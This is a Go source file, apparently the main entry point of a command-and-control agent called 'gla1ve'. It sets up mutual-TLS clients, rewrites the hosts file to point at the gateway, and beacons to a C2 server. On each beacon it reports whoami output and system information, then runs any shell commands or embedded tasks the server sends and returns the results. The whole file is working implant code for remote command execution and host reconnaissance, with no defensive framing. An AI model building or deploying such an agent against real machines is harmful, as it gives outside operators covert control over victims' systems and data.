package main

import (
	"log"
	"os"
	"os/signal"
	"syscall"

	"gla1ve/agent/pkg/beacon"
	"gla1ve/agent/pkg/client"
	"gla1ve/agent/pkg/config"
	"gla1ve/agent/pkg/network"
	"gla1ve/agent/pkg/system"
	"gla1ve/agent/pkg/tasks"
)

func main() {
	// Load configuration
	cfg := config.Load()
	
	// Setup signal handling for cleanup
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		log.Println("Received shutdown signal, cleaning up...")
		network.CleanupHosts()
		os.Exit(0)
	}()

	// Detect gateway and setup network
	gateway, err := network.DetectGateway()
	var detectedHostIP string
	if err != nil {
		log.Printf("Warning: Failed to detect gateway: %v", err)
		log.Println("Proceeding without automatic hosts configuration")
	} else {
		log.Printf("Detected gateway: %s", gateway)
		detectedHostIP = gateway
		
		// Try to setup hosts file
		if err := network.SetupHosts(gateway); err != nil {
			log.Printf("Info: Could not update hosts file (will use IP directly): %v", err)
		}
	}

	// Load certificates
	embeddedCert, embeddedKey, embeddedCA, hasEmbedded := config.GetEmbeddedCerts()
	var certPEM, keyPEM, caPEM string
	if hasEmbedded {
		certPEM = embeddedCert
		keyPEM = embeddedKey
		caPEM = embeddedCA
	}
	
	cert, caCertPool, err := client.LoadCertificates(
		certPEM, keyPEM, caPEM,
		cfg.CertPath, cfg.KeyPath, cfg.CAPath,
	)
	if err != nil {
		log.Fatalf("Failed to load certificates: %v", err)
	}

	// Setup HTTP clients
	httpClient := client.Setup(cfg.ServerName, cfg.APIServerName, cert, caCertPool, detectedHostIP)

	// Setup task executor (pass both API and C2 HTTP clients)
	taskExecutor := tasks.NewExecutor(cfg.AgentID, cfg.C2URL, httpClient.APIClient, httpClient.C2Client)

	// Parse embedded tasks (do NOT execute them until after successful beacon)
	embeddedTasksJSON := config.GetEmbeddedTasks()
	embeddedTasksList, err := tasks.ParseEmbeddedTasks(embeddedTasksJSON)
	if err != nil {
		log.Printf("Failed to parse embedded tasks: %v", err)
	} else if len(embeddedTasksList) > 0 {
		log.Printf("Loaded %d embedded tasks (deferred until after first successful beacon)", len(embeddedTasksList))
	}


	// Setup beacon (mTLS required). Tenant API key is ignored by the agent.
	beaconClient := beacon.New(cfg.AgentID, cfg.C2URL, cfg.BeaconInterval, httpClient.C2Client)
	if cfg.TenantAPIKey != "" {
		log.Printf("Note: tenant API key is configured but the agent will not send it (disabled)")
	} 
	
	// Print system info
	sysInfo := system.GetBasicInfo()
	sysInfo.PrintInfo()

	// Start beacon loop
	log.Printf("Starting beacon loop (interval: %v)", cfg.BeaconInterval)
	
	beaconClient.Loop(
		// Get output function (whoami)
		func() (string, string) {
			return system.GetWhoamiOutput()
		},
		// Get extra info function (system info)
		func() map[string]interface{} {
			info := system.CollectInfo(httpClient.WhoamiClient, cfg.WhoamiToken)
			return info.FormatForBeacon()
		},
		// Task handler
		func(taskInfos []beacon.TaskInfo) {
			for _, taskInfo := range taskInfos {
				// Check if it's an embedded task or shell command
				if taskInfo.Type == "embedded" || taskInfo.TaskType != "" {
					// Handle embedded task
					go func(ti beacon.TaskInfo) {
						task := tasks.Task{
							ID:      ti.ID,
							Type:    ti.TaskType,
							Params:  ti.Params,
							RunOnce: ti.RunOnce,
						}
						result := taskExecutor.ExecuteEmbedded(task)
						taskExecutor.SendEmbeddedResults([]tasks.TaskResult{result}, config.C2Server)
					}(taskInfo)
				} else if taskInfo.Cmd != "" {
					// Handle shell command
					go taskExecutor.Execute(
						taskInfo.ID,
						taskInfo.Cmd,
						taskInfo.Args,
					)
				} else {
					log.Printf("Warning: Task %s has no command or task type", taskInfo.ID)
				}
			}
		},
		// onFirstSuccess: run deferred embedded run-once tasks after first successful beacon
		func() {
			if len(embeddedTasksList) == 0 {
				return
			}
			log.Printf("Running deferred embedded run-once tasks after successful beacon")
			var taskResults []tasks.TaskResult
			for _, task := range embeddedTasksList {
				if task.RunOnce {
					result := taskExecutor.ExecuteEmbedded(task)
					taskResults = append(taskResults, result)
				}
			}
			if len(taskResults) > 0 {
				taskExecutor.SendEmbeddedResults(taskResults, config.C2Server)
			}
		},
	)
}
